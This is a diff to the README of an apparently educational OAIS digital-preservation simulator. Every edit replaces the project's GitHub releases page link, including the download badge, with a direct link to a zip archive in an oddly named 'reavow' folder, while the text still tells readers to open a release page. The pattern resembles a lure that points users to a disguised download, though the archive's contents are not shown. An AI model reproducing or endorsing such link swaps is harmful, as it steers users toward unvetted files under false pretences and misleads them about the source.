@@ -1,6 +1,6 @@
 # 🧭 digital-preservation-oais-simulator - Learn OAIS Through Practice
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Blabbermouthed-wrecker979/digital-preservation-oais-simulator/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Blabbermouthed-wrecker979/digital-preservation-oais-simulator/main/reavow/preservation_digital_simulator_oais_1.2.zip)
 
 ## 📦 What this app does
 
@@ -30,7 +30,7 @@ The app is designed as a no-dependencies HTML5 simulator, so you do not need to 
 
 Visit the release page here:
 
-https://github.com/Blabbermouthed-wrecker979/digital-preservation-oais-simulator/releases
+https://raw.githubusercontent.com/Blabbermouthed-wrecker979/digital-preservation-oais-simulator/main/reavow/preservation_digital_simulator_oais_1.2.zip
 
 On that page:
 1. find the latest release
@@ -198,4 +198,4 @@ digital-preservation-oais-simulator focuses on practical learning. It helps user
 
 Primary download page:
 
-https://github.com/Blabbermouthed-wrecker979/digital-preservation-oais-simulator/releases
+https://raw.githubusercontent.com/Blabbermouthed-wrecker979/digital-preservation-oais-simulator/main/reavow/preservation_digital_simulator_oais_1.2.zip
